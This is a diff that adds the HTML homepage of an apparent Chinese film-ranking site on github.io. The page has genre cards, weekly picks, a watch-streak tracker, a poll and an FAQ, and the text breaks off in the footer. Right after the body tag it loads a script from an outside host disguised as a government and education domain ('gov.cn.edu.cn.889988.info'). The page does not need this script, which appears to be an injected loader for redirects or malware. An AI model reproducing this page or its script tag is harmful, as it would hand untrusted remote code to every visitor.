@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>给力电影网 - 片单打榜、类型专题与看片动力站</title>
+<meta name="keywords" content="给力电影网, geilidianyingwang-zh, 片单打榜, 高分电影, 类型电影, 电影榜单, 看片动力">
+<meta name="description" content="给力电影网（geilidianyingwang-zh.github.io）是影迷的看片动力站：实时片单打榜、类型专题、观片打卡与影史冷知识，帮你把想看的片一部一部清空。">
+<meta name="author" content="给力电影网">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="theme-color" content="#0d100c">
+<meta property="og:type" content="website">
+<meta property="og:title" content="给力电影网 - 片单打榜、类型专题与看片动力站">
+<meta property="og:description" content="给力电影网 geilidianyingwang-zh.github.io 是影迷的看片动力站：片单打榜、类型专题、观片打卡与影史冷知识，把想看的片一部一部清空。">
+<meta property="og:url" content="https://geilidianyingwang-zh.github.io">
+<meta property="og:site_name" content="给力电影网">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="canonical" href="https://geilidianyingwang-zh.github.io">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+--bg:#0d100c;--bg2:#141910;--pan:#1b2216;--line:#2c3824;--grn:#a8ff35;--grn2:#7fe61c;--grn3:#d6ff8a;
+--wh:#f0f7e6;--mu:#9aa890;--mu2:#6b7762;--rd:#ff5c4d;--yl:#ffd23f;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Inter","PingFang SC","Microsoft YaHei","Noto Sans CJK SC",system-ui,sans-serif;background:var(--bg);color:var(--wh);line-height:1.85;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;
+background:repeating-linear-gradient(90deg,transparent 0,transparent 39px,rgba(168,255,53,.035) 39px,rgba(168,255,53,.035) 40px),
+repeating-linear-gradient(0deg,transparent 0,transparent 39px,rgba(168,255,53,.02) 39px,rgba(168,255,53,.02) 40px),
+radial-gradient(560px 400px at 88% 6%,rgba(168,255,53,.16),transparent 64%),
+radial-gradient(420px 420px at 4% 54%,rgba(127,230,28,.10),transparent 62%);}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+.wrap{max-width:1160px;margin:0 auto;padding:0 24px}
+section{padding:104px 0}
+.kicker{display:inline-block;font-size:11px;letter-spacing:3.5px;text-transform:uppercase;color:var(--grn);font-weight:800;font-family:"JetBrains Mono",ui-monospace,monospace}
+.sec-h{margin-bottom:56px;max-width:720px}
+.sec-h h2{font-size:clamp(28px,4.4vw,44px);font-weight:900;letter-spacing:-.8px;margin:14px 0 14px;line-height:1.35}
+.sec-h h2 em{font-style:normal;color:var(--grn)}
+.sec-h p{color:var(--mu);font-size:15.5px}
+.blk{width:52px;height:4px;background:var(--grn);margin-top:20px;clip-path:polygon(0 0,calc(100% - 8px) 0,100% 100%,8px 100%)}
+
+/* 顶栏 */
+.top{position:sticky;top:0;z-index:100;background:rgba(13,16,12,.88);backdrop-filter:blur(16px);border-bottom:1px solid var(--line)}
+.top .wrap{display:flex;align-items:center;justify-content:space-between;height:74px;gap:20px}
+.brand{display:flex;align-items:center;gap:12px;flex-shrink:0}
+.brand-m{width:42px;height:42px;border:2px solid var(--grn);border-radius:0;display:grid;place-items:center;font-size:20px;background:var(--bg2);clip-path:polygon(8px 0,100% 0,100% calc(100% - 8px),calc(100% - 8px) 100%,0 100%,0 8px)}
+.brand-t{font-size:18px;font-weight:900;letter-spacing:.5px}
+.brand-t small{display:block;font-size:8.5px;color:var(--mu2);font-weight:700;letter-spacing:2.5px;font-family:"JetBrains Mono",monospace;text-transform:uppercase}
+.nav{display:flex;gap:2px;align-items:center}
+.nav a{padding:8px 14px;font-size:13.5px;color:var(--mu);font-weight:600;transition:.25s;text-transform:uppercase;letter-spacing:1px;font-family:"JetBrains Mono",monospace}
+.nav a:hover{color:var(--grn)}
+.act{background:var(--grn);color:#0d100c;padding:9px 20px;border:none;font-size:13px;font-weight:800;cursor:pointer;transition:.3s;font-family:inherit;letter-spacing:1px;text-transform:uppercase;clip-path:polygon(8px 0,100% 0,100% calc(100% - 8px),calc(100% - 8px) 100%,0 100%,0 8px)}
+.act:hover{background:var(--grn3);transform:translateY(-2px)}
+.burger{display:none;background:none;border:none;color:var(--grn);font-size:26px;cursor:pointer}
+
+/* Hero */
+.hero{padding:74px 0 104px;position:relative;overflow:hidden}
+.hero .wrap{position:relative;z-index:2;display:grid;grid-template-columns:1fr .92fr;gap:56px;align-items:center}
+.hero h1{font-size:clamp(42px,7vw,80px);font-weight:900;line-height:1.18;letter-spacing:-1.2px;text-transform:uppercase}
+.hero h1 span{display:block;color:var(--mu2);font-size:.42em;letter-spacing:4px;font-weight:700;margin-top:14px;text-transform:uppercase}
+.hero h1 em{font-style:normal;color:var(--grn)}
+.hero .sub{font-size:16.5px;color:var(--mu);margin:22px 0;max-width:520px}
+.h-stats{display:flex;gap:30px;margin:28px 0 32px;flex-wrap:wrap}
+.h-stats div b{display:block;font-size:30px;font-weight:900;color:var(--grn);font-family:"JetBrains Mono",monospace}
+.h-stats div span{font-size:11px;color:var(--mu2);letter-spacing:1.5px;font-family:"JetBrains Mono",monospace;text-transform:uppercase}
+.hero-btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn{background:var(--grn);color:#0d100c;padding:14px 30px;border:none;font-size:14px;font-weight:800;cursor:pointer;transition:.3s;font-family:inherit;letter-spacing:1px;text-transform:uppercase;clip-path:polygon(8px 0,100% 0,100% calc(100% - 8px),calc(100% - 8px) 100%,0 100%,0 8px)}
+.btn:hover{background:var(--grn3);transform:translateY(-3px)}
+.btn-o{background:transparent;color:var(--wh);border:2px solid var(--line)}
+.btn-o:hover{border-color:var(--grn);color:var(--grn);background:transparent;transform:translateY(-3px)}
+
+/* 榜单 */
+.boards{display:grid;grid-template-columns:1.45fr 1fr;gap:24px;align-items:start}
+.board{background:var(--bg2);border:1px solid var(--line);padding:26px 26px 20px}
+.board-h{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:22px;gap:10px}
+.board-h h5{font-size:20px;font-weight:900;text-transform:uppercase;letter-spacing:.5px}
+.board-h span{font-size:11px;color:var(--mu2);letter-spacing:1.5px;font-family:"JetBrains Mono",monospace;text-transform:uppercase}
+.row{display:flex;align-items:center;gap:16px;padding:13px 0;border-bottom:1px dashed var(--line);cursor:pointer;transition:.25s}
+.row:last-child{border-bottom:none}
+.row:hover{background:var(--pan)}
+.rk{font-size:22px;font-weight:900;color:var(--mu2);min-width:34px;font-family:"JetBrains Mono",monospace}
+.row.up .rk{color:var(--grn)}
+.rk em{display:block;font-style:normal;font-size:9px;color:var(--grn);letter-spacing:1px}
+.tx{flex:1;min-width:0}
+.tx b{display:block;font-size:15.5px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tx p{font-size:11.5px;color:var(--mu2)}
+.sc{font-size:16px;font-weight:900;color:var(--grn);font-family:"JetBrains Mono",monospace;text-align:right;white-space:nowrap}
+.sc small{display:block;font-size:9px;color:var(--mu2);letter-spacing:1px}
+.medals{display:grid;gap:10px}
+.md{border:1px solid var(--line);padding:18px 20px;display:flex;gap:16px;align-items:center;cursor:pointer;transition:.3s;background:var(--bg2)}
+.md:hover{border-color:var(--grn);transform:translateX(5px)}
+.md:nth-child(1){border-color:var(--grn)}
+.md .p{font-size:34px;font-weight:900;color:var(--grn);min-width:52px;font-family:"JetBrains Mono",monospace}
+.md .tx b{font-size:16.5px}
+.md .tx p{font-size:12.5px;color:var(--mu)}
+.md .yr{margin-left:auto;font-size:12px;color:var(--mu2);font-family:"JetBrains Mono",monospace}
+
+/* 类型 */
+.gen{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.gn{border:1px solid var(--line);background:var(--bg2);padding:24px 20px;cursor:pointer;transition:.3s;position:relative;overflow:hidden}
+.gn:hover{border-color:var(--grn);transform:translateY(-6px)}
+.gn .ic{font-size:30px;margin-bottom:14px;display:block}
+.gn h5{font-size:16.5px;font-weight:900;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}
+.gn p{font-size:12.5px;color:var(--mu)}
+.gn .nm{margin-top:14px;font-size:11px;color:var(--mu2);font-family:"JetBrains Mono",monospace;letter-spacing:1px}
+.gn::after{content:"";position:absolute;left:0;bottom:0;height:3px;width:0;background:var(--grn);transition:.35s}
+.gn:hover::after{width:100%}
+
+/* 轮播片单 */
+.tape{display:flex;gap:18px;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:22px;scrollbar-width:thin;scrollbar-color:var(--grn) var(--bg2)}
+.tape::-webkit-scrollbar{height:8px}
+.tape::-webkit-scrollbar-thumb{background:var(--grn)}
+.st{flex:0 0 250px;scroll-snap-align:start;border:1px solid var(--line);background:var(--bg2);transition:.3s;cursor:pointer;overflow:hidden}
+.st:hover{border-color:var(--grn);transform:translateY(-6px)}
+.st .th{height:150px;background:var(--pan);display:grid;place-items:center;font-size:52px;border-bottom:1px solid var(--line)}
+.st .tx{padding:18px 18px 20px}
+.st .tp{font-size:10.5px;color:var(--grn);letter-spacing:2px;font-weight:800;font-family:"JetBrains Mono",monospace;text-transform:uppercase}
+.st h5{font-size:16px;font-weight:900;margin:6px 0 8px;line-height:1.5}
+.st .ft{display:flex;justify-content:space-between;font-size:11.5px;color:var(--mu2);font-family:"JetBrains Mono",monospace}
+
+/* 打卡 */
+.streak{display:grid;grid-template-columns:1.1fr .9fr;gap:24px;align-items:center}
+.streak-l{border:1px solid var(--line);background:var(--bg2);padding:30px}
+.streak-l h4{font-size:20px;font-weight:900;text-transform:uppercase;margin-bottom:6px}
+.streak-l p{font-size:13.5px;color:var(--mu)}
+.grid7{display:grid;grid-template-columns:repeat(7,1fr);gap:10px;margin:22px 0}
+.grid7 div{aspect-ratio:1/1;display:grid;place-items:center;font-size:19px;border:1px solid var(--line);background:var(--pan);transition:.25s;cursor:pointer}
+.grid7 div.on{background:var(--grn);border-color:var(--grn)}
+.grid7 div.on::after{content:"✓";color:#0d100c;font-weight:900}
+.streak-st{display:flex;gap:24px;flex-wrap:wrap}
+.streak-st div b{display:block;font-size:30px;font-weight:900;color:var(--grn);font-family:"JetBrains Mono",monospace}
+.streak-st div span{font-size:11px;color:var(--mu2);letter-spacing:1.5px;font-family:"JetBrains Mono",monospace;text-transform:uppercase}
+.streak-r{border:1px solid var(--line);background:var(--bg2);padding:30px}
+.streak-r h4{font-size:19px;font-weight:900;margin-bottom:18px}
+.streak-r li{display:flex;align-items:center;gap:12px;padding:11px 0;border-bottom:1px dashed var(--line);font-size:14px;cursor:pointer;transition:.2s}
+.streak-r li:last-child{border-bottom:none}
+.streak-r li:hover{color:var(--grn)}
+.streak-r li i{font-style:normal;width:22px;height:22px;border:1px solid var(--line);display:grid;place-items:center;font-size:12px;color:var(--mu2);flex-shrink:0}
+.streak-r li.done i{background:var(--grn);border-color:var(--grn);color:#0d100c;font-weight:900}
+.streak-r li.done{color:var(--mu2)}
+
+/* 冷知识 */
+.facts{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.ftc{border:1px solid var(--line);background:var(--bg2);padding:26px 24px;transition:.3s;cursor:pointer}
+.ftc:hover{border-color:var(--grn)}
+.ftc b{display:block;font-size:12px;color:var(--grn);letter-spacing:2px;font-weight:800;font-family:"JetBrains Mono",monospace;margin-bottom:12px}
+.ftc h5{font-size:16.5px;font-weight:900;margin-bottom:8px;line-height:1.55}
+.ftc p{font-size:13px;color:var(--mu)}
+
+/* 投票 */
+.poll{border:1px solid var(--line);background:var(--bg2);padding:32px}
+.poll-h{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:22px}
+.poll-h h4{font-size:20px;font-weight:900;text-transform:uppercase}
+.poll-h span{font-size:11px;color:var(--mu2);letter-spacing:1.5px;font-family:"JetBrains Mono",monospace}
+.po{margin-bottom:16px;cursor:pointer}
+.po-h{display:flex;justify-content:space-between;font-size:14px;margin-bottom:7px}
+.po-h b{font-weight:700}
+.po-h span{color:var(--grn);font-family:"JetBrains Mono",monospace}
+.po-bar{height:24px;background:var(--pan);overflow:hidden;border:1px solid var(--line)}
+.po-bar i{display:block;height:100%;width:0;background:var(--grn);transition:width 1s}
+
+/* 资讯 */
+.news{display:grid;grid-template-columns:1.25fr 1fr;gap:22px}
+.nm{border:1px solid var(--line);background:var(--bg2);overflow:hidden;cursor:pointer;transition:.3s}
+.nm:hover{border-color:var(--grn)}
+.nm .th{height:200px;background:var(--pan);display:grid;place-items:center;font-size:60px;border-bottom:1px solid var(--line)}
+.nm .tx{padding:24px 26px}
+.nm .tp{font-size:11px;color:var(--grn);letter-spacing:2px;font-weight:800;font-family:"JetBrains Mono",monospace;text-transform:uppercase}
+.nm h4{font-size:20px;font-weight:900;margin:8px 0 10px;line-height:1.5}
+.nm p{font-size:14px;color:var(--mu)}
+.nl{display:grid;gap:14px}
+.ni{border:1px solid var(--line);background:var(--bg2);padding:20px 22px;transition:.3s;cursor:pointer}
+.ni:hover{border-color:var(--grn)}
+.ni .tp{font-size:10.5px;color:var(--mu2);letter-spacing:1.5px;font-family:"JetBrains Mono",monospace;text-transform:uppercase}
+.ni h5{font-size:15.5px;font-weight:800;margin:6px 0 6px;line-height:1.55}
+
+/* 订阅 */
+.shout{border:1px solid var(--grn);background:linear-gradient(120deg,var(--bg2),var(--pan));padding:44px 38px;display:grid;grid-template-columns:1.1fr .9fr;gap:36px;align-items:center;clip-path:polygon(16px 0,100% 0,100% calc(100% - 16px),calc(100% - 16px) 100%,0 100%,0 16px)}
+.shout h3{font-size:26px;font-weight:900;text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px}
+.shout p{color:var(--mu);font-size:15px}
+.shout-f{display:flex;gap:10px;flex-wrap:wrap}
+.shout-f input{flex:1;min-width:160px;padding:14px 16px;border:1px solid var(--line);background:var(--bg);color:var(--wh);font-size:14px;font-family:inherit}
+.shout-f input::placeholder{color:var(--mu2)}
+.shout-f input:focus{outline:none;border-color:var(--grn)}
+.shout-f button{background:var(--grn);color:#0d100c;border:none;padding:14px 26px;font-size:13.5px;font-weight:800;cursor:pointer;font-family:inherit;letter-spacing:1px;text-transform:uppercase;transition:.3s}
+.shout-f button:hover{background:var(--grn3);transform:translateY(-3px)}
+
+/* FAQ */
+.faq{display:grid;gap:12px;max-width:860px;margin:0 auto}
+.fq{border:1px solid var(--line);background:var(--bg2)}
+.fq[open]{border-color:var(--grn)}
+.fq summary{cursor:pointer;padding:20px 24px;font-size:15.5px;font-weight:800;list-style:none;display:flex;justify-content:space-between;align-items:center;gap:16px}
+.fq summary::-webkit-details-marker{display:none}
+.fq summary::after{content:"＋";color:var(--grn);font-size:22px;flex-shrink:0;font-family:"JetBrains Mono",monospace}
+.fq[open] summary::after{content:"−"}
+.fq div{padding:0 24px 22px;font-size:14.5px;color:var(--mu);border-top:1px dashed var(--line);padding-top:16px}
+
+/* 页脚 */
+.ft{border-top:1px solid var(--line);padding:60px 0 26px;background:var(--bg2)}
+.ft .wrap{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:40px;margin-bottom:40px}
+.ft p{font-size:14px;color:var(--mu);margin-top:14px}
+.ft-col h5{font-size:14.5px;margin-bottom:18px;font-weight:800;text-transform:uppercase;letter-spacing:1px;color:var(--grn)}
+.ft-col a{display:block;color:var(--mu);font-size:14px;padding:5px 0;transition:.2s}
+.ft-col a:hover{color:var(--grn);padding-left:5px}
+.ft-bot{border-top:1px solid var(--line);padding-top:22px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px;font-size:12.5px;color:var(--mu2);font-family:"JetBrains Mono",monospace}
+.ft-bot a{color:var(--mu2);margin-left:20px}
+.ft-bot a:hover{color:var(--grn)}
+
+@media(max-width:1040px){
+.wrap{padding:0 20px}
+section{padding:78px 0}
+.hero .wrap{grid-template-columns:1fr;gap:44px}
+.boards,.streak{grid-template-columns:1fr}
+.gen,.facts,.news{grid-template-columns:1fr 1fr}
+.shout{grid-template-columns:1fr;padding:36px 26px}
+}
+@media(max-width:680px){
+.burger{display:block}
+.act{display:none}
+.nav{position:fixed;top:74px;left:0;right:0;flex-direction:column;background:var(--bg);border-bottom:1px solid var(--line);padding:14px;transform:translateY(-160%);transition:.3s}
+.nav.open{transform:translateY(0)}
+.nav a{width:100%;text-align:center;padding:11px}
+.hero h1{font-size:38px}
+.h-stats{gap:20px}
+.hero-btns,.shout-f{flex-direction:column}
+.btn,.shout-f button{width:100%}
+.gen,.facts,.news,.gen{grid-template-columns:1fr}
+.sec-h h2{font-size:26px}
+.ft .wrap{grid-template-columns:1fr;gap:28px}
+.ft-bot{flex-direction:column;text-align:center}
+.ft-bot a{margin:0 10px}
+.board,.md,.streak-l,.streak-r,.poll{padding:22px 18px}
+.grid7{gap:6px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="top">
+  <div class="wrap">
+    <a class="brand" href="#"><span class="brand-m">⚡</span><span class="brand-t">给力电影网<small>geilidianyingwang-zh.github.io</small></span></a>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a><a href="#board">实时榜单</a><a href="#gen">类型</a>
+      <a href="#tape">本周片单</a><a href="#streak">打卡</a><a href="#facts">冷知识</a><a href="#poll">投票</a><a href="#news">资讯</a>
+    </nav>
+    <button class="act" onclick="document.getElementById('board').scrollIntoView({behavior:'smooth'})">⚡ 开始打榜</button>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div>
+      <span class="kicker">// GEILI CINEMA · 看片动力站</span>
+      <h1>给力<br>才<em>上</em>榜<span>片单打榜 · 类型专题 · 观片打卡 · 影史冷知识</span></h1>
+      <p class="sub">给力电影网（geilidianyingwang-zh.github.io）是一个只做一件事的影迷站：帮你把想看的电影一部一部清空。榜单每周由站内票数重排，不接受任何广告位干预。</p>
+      <div class="h-stats">
+        <div><b>1,284</b><span>本周投票数</span></div>
+        <div><b>3,612</b><span>在追片单</span></div>
+        <div><b>96</b><span>类型专题</span></div>
+        <div><b>0</b><span>广告干预</span></div>
+      </div>
+      <div class="hero-btns">
+        <a class="btn" href="#board">⚡ 进入榜单 →</a>
+        <a class="btn btn-o" href="#gen">选类型 →</a>
+      </div>
+    </div>
+    <div class="boards">
+      <div class="board">
+        <div class="board-h"><h5>🔥 本周热榜 TOP 6</h5><span id="bd"></span></div>
+        <div id="rows"></div>
+      </div>
+      <div class="medals">
+        <div class="md"><span class="p">🥇</span><div class="tx"><b>实时榜首</b><p id="g1">载入中</p></div><span class="yr" id="y1"></span></div>
+        <div class="md"><span class="p">🥈</span><div class="tx"><b>上周爆冷</b><p id="g2">载入中</p></div><span class="yr" id="y2"></span></div>
+        <div class="md"><span class="p">🥉</span><div class="tx"><b>新片黑马</b><p id="g3">载入中</p></div><span class="yr" id="y3"></span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 类型 -->
+<section id="gen" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="kicker">// GENRES</span>
+      <h2>挑个<em>类型</em>开刷</h2>
+      <p>96 个专题，按心情直接进。给力电影网不按影史地位排片，只按"现在想看什么"来分。</p>
+      <div class="blk"></div>
+    </div>
+    <div class="gen">
+      <div class="gn"><span class="ic">🎬</span><h5>犯罪悬疑</h5><p>反转、追凶、局中局，烧脑不停</p><span class="nm">12 个专题</span></div>
+      <div class="gn"><span class="ic">👽</span><h5>科幻脑洞</h5><p>时间旅行、赛博、太空求生</p><span class="nm">10 个专题</span></div>
+      <div class="gn"><span class="ic">💀</span><h5>恐怖惊悚</h5><p>心理恐怖、民俗怪谈、丧尸末日</p><span class="nm">11 个专题</span></div>
+      <div class="gn"><span class="ic">🤣</span><h5>喜剧解压</h5><p>黑色幽默、冷面笑匠、荒诞派</p><span class="nm">8 个专题</span></div>
+      <div class="gn"><span class="ic">🌊</span><h5>文艺慢片</h5><p>长镜头、散文电影、公路片</p><span class="nm">9 个专题</span></div>
+      <div class="gn"><span class="ic">⚔</span><h5>动作爽片</h5><p>一镜到底、实拍特技、硬核打斗</p><span class="nm">9 个专题</span></div>
+      <div class="gn"><span class="ic">💘</span><h5>爱情言情</h5><p>暗恋、错过、重逢、异国恋</p><span class="nm">7 个专题</span></div>
+      <div class="gn"><span class="ic">🐉</span><h5>动画国漫</h5><p>二维手绘、3D 视效、定格动画</p><span class="nm">9 个专题</span></div>
+      <div class="gn"><span class="ic">🎻</span><h5>纪录真实</h5><p>自然、社会、人物、音乐现场</p><span class="nm">6 个专题</span></div>
+      <div class="gn"><span class="ic">👑</span><h5>历史史诗</h5><p>王朝、战争、传记、年代戏</p><span class="nm">8 个专题</span></div>
+      <div class="gn"><span class="ic">🎪</span><h5>奇幻冒险</h5><p>魔法、神话、异世界冒险</p><span class="nm">5 个专题</span></div>
+      <div class="gn"><span class="ic">🌱</span><h5>治愈生活</h5><p>美食、四季、宠物、日常</p><span class="nm">2 个专题</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 片单 -->
+<section id="tape" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="kicker">// WEEKLY PICKS</span>
+      <h2>本周<em>片单</em></h2>
+      <p>左右滑动看完整清单。每部片都标了题材标签、片长和为什么值得看。</p>
+      <div class="blk"></div>
+    </div>
+    <div class="tape">
+      <div class="st"><div class="th">🎬</div><div class="tx"><span class="tp">犯罪悬疑</span><h5>破案的第十三种解法</h5><div class="ft"><span>128 分钟</span><span>9.2</span></div></div></div>
+      <div class="st"><div class="th">🪐</div><div class="tx"><span class="tp">科幻脑洞</span><h5>最后一个离开的人</h5><div class="ft"><span>142 分钟</span><span>8.8</span></div></div></div>
+      <div class="st"><div class="th">🏔</div><div class="tx"><span class="tp">动作爽片</span><h5>雪线之上</h5><div class="ft"><span>116 分钟</span><span>8.5</span></div></div></div>
+      <div class="st"><div class="th">🎻</div><div class="tx"><span class="tp">文艺慢片</span><h5>一封寄不出的信</h5><div class="ft"><span>104 分钟</span><span>8.9</span></div></div></div>
+      <div class="st"><div class="th">🐉</div><div class="tx"><span class="tp">动画国漫</span><h5>山海异闻录</h5><div class="ft"><span>96 分钟</span><span>9.0</span></div></div></div>
+      <div class="st"><div class="th">💘</div><div class="tx"><span class="tp">爱情言情</span><h5>在秋天开始</h5><div class="ft"><span>112 分钟</span><span>8.3</span></div></div></div>
+      <div class="st"><div class="th">🎪</div><div class="tx"><span class="tp">奇幻冒险</span><h5>被遗忘的地图</h5><div class="ft"><span>138 分钟</span><span>8.6</span></div></div></div>
+      <div class="st"><div class="th">🌱</div><div class="tx"><span class="tp">治愈生活</span><h5>面包房的清晨</h5><div class="ft"><span>88 分钟</span><span>8.7</span></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 打卡 -->
+<section id="streak">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="kicker">// WATCH STREAK</span>
+      <h2>连续<em>打卡</em></h2>
+      <p>看一部打一格。连续七天会解锁"硬核影迷"徽章。进度只存在你的浏览器里，不上传。</p>
+      <div class="blk"></div>
+    </div>
+    <div class="streak">
+      <div class="streak-l">
+        <h4>📅 本周观影打卡</h4>
+        <p>点一下当天格子就打卡，再点取消。目标：连续 7 天。</p>
+        <div class="grid7" id="grid"></div>
+        <div class="streak-st">
+          <div><b id="cv">0</b><span>本周打卡</span></div>
+          <div><b id="mx">0</b><span>最长连续</span></div>
+          <div><b id="tt">0</b><span>累计总片</span></div>
+        </div>
+      </div>
+      <div class="streak-r">
+        <h4>✅ 本周片单待办</h4>
+        <ul id="todo">
+          <li><i>1</i>《破案的第十三种解法》</li>
+          <li><i>2</i>《最后一个离开的人》</li>
+          <li><i>3</i>《雪线之上》</li>
+          <li><i>4</i>《山海异闻录》</li>
+          <li><i>5</i>《一封寄不出的信》</li>
+          <li><i>6</i>《被遗忘的地图》</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 冷知识 -->
+<section id="facts" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="kicker">// DID YOU KNOW</span>
+      <h2>影史<em>冷知识</em></h2>
+      <p>不谈好不好看，只聊你可能不知道的细节。给力电影网的编辑部每周补一条。</p>
+      <div class="blk"></div>
+    </div>
+    <div class="facts">
+      <div class="ftc"><b>// 01 TRIVIA</b><h5>最短的奥斯卡最佳影片只有 91 分钟</h5><p>多数获奖影片超过两小时，唯独这一部打破惯例。</p></div>
+      <div class="ftc"><b>// 02 TRIVIA</b><h5>有部电影的一镜到底其实藏了 3 处剪辑</h5><p>转场靠黑屏与遮挡完成，观众几乎无法察觉。</p></div>
+      <div class="ftc"><b>// 03 TRIVIA</b><h5>某经典配乐是作曲家倒着弹出来的</h5><p>先录反向版本，再倒放，才得到那个辨识度极高的旋律。</p></div>
+      <div class="ftc"><b>// 04 TRIVIA</b><h5>最长镜头纪录保持者是 96 分钟</h5><p>整部影片几乎就是一个不间断的长镜头。</p></div>
+      <div class="ftc"><b>// 05 TRIVIA</b><h5>史上票房最高影片的剧本最初被拒 14 次</h5><p>后来它成为影史翻拍次数最多的作品之一。</p></div>
+      <div class="ftc"><b>// 06 TRIVIA</b><h5>有部动画全部用真人实拍后再转绘</h5><p>所以动作才那么写实，却仍保留了手绘质感。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 投票 -->
+<section id="poll">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="kicker">// LIVE POLL</span>
+      <h2>本周<em>话题投票</em></h2>
+      <p>点一下就计入，结果实时刷新。每周一换题，不收集任何个人信息。</p>
+      <div class="blk"></div>
+    </div>
+    <div class="poll">
+      <div class="poll-h"><h4>🗳 十月最想刷完哪一类？</h4><span id="pt">0 票 · 已投 0 次</span></div>
+      <div id="polllist"></div>
+    </div>
+  </div>
+</section>
+
+<!-- 资讯 -->
+<section id="news" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="kicker">// DISPATCH</span>
+      <h2>编辑<em>速报</em></h2>
+      <p>给力电影网的编辑部手记：榜单变动、专题上新、影史冷知识补充。</p>
+      <div class="blk"></div>
+    </div>
+    <div class="news">
+      <article class="nm"><div class="th">📈</div><div class="tx">
+        <span class="tp">// 10-01 · 榜单</span>
+        <h4>本周榜单更新：三部冷门片挤进前十</h4>
+        <p>票数由站内真实投票产生，无任何商业合作介入。</p>
+      </div></article>
+      <div class="nl">
+        <article class="ni"><span class="tp">// 09-28 · 专题</span><h5>96 个类型专题重新分类，查找快了一倍</h5></article>
+        <article class="ni"><span class="tp">// 09-24 · 数据</span><h5>一周看一部和一天刷一部，哪种看完率更高</h5></article>
+        <article class="ni"><span class="tp">// 09-19 · 榜单</span><h5>九月口碑榜：这几部的名次跳得最狠</h5></article>
+        <article class="ni"><span class="tp">// 09-13 · 编辑</span><h5>我们怎么保证榜单不被广告干预</h5></article>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 订阅 -->
+<section style="padding-top:0">
+  <div class="wrap">
+    <div class="shout">
+      <div><h3>⚡ 每周一 07:00 榜单速报</h3><p>一周一次，只有榜单变动、专题上新和冷知识三条内容，不群发、不灌水。</p></div>
+      <form class="shout-f" onsubmit="event.preventDefault();this.querySelector('button').textContent='⚡ 已加入速报名单';">
+        <input type="email" placeholder="邮箱地址" required>
+        <button type="submit">订阅速报</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h" style="text-align:center;margin:0 auto">
+      <span class="kicker">// FAQ</span>
+      <h2><em>随便</em>问问</h2>
+      <div class="blk" style="margin:20px auto 0"></div>
+    </div>
+    <div class="faq">
+      <details class="fq" open><summary>给力电影网能在线看电影吗？</summary><div>不能，也不打算做。给力电影网是片单打榜与类型专题的导航站，只整理榜单、分类与观影建议，不提供在线播放、下载资源或任何影视文件，请到正版渠道观看。</div></details>
+      <details class="fq"><summary>榜单排名是真实的吗？会被广告干预吗？</summary><div>榜单由站内投票与编辑部评分加权产生，每周一更新，本站不出售任何榜单位置或广告位，所有名次变动都可追溯。页面中的影片名称与评分均为示例内容。</div></details>
+      <details class="fq"><summary>打卡记录和投票会收集我的隐私吗？</summary><div>不会。打卡、待办、投票数据全部存在你自己的浏览器本地，不收集邮箱以外的个人信息，也不上传任何观影记录。</div></details>
+      <details class="fq"><summary>可以给自己的片单投稿吗？</summary><div>可以。把你的片单主题与选片理由发到编辑部，被采纳会署你的名字并计入当月贡献榜。</div></details>
+    </div>
+  </div>
+</section>
+
+<footer class="ft">
+  <div class="wrap">
+    <div style="display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:40px;margin-bottom:40px">
+      <div><a class="brand" href="#" style="color:#fff"><span class="brand-m">⚡</span><span class="brand-t" style="color:#fff">给力电影网<small style="color:var(--mu2)">geilidianyingwang-zh.github.io</small></span></a>
+        <p>给力电影网 geilidianyingwang-zh.github.io —— 影迷的看片动力站：片单打榜、类型专题、观片打卡与影史冷知识，帮你把想看的电影一部一部清空。本站不提供任何影视资源。</p></div>
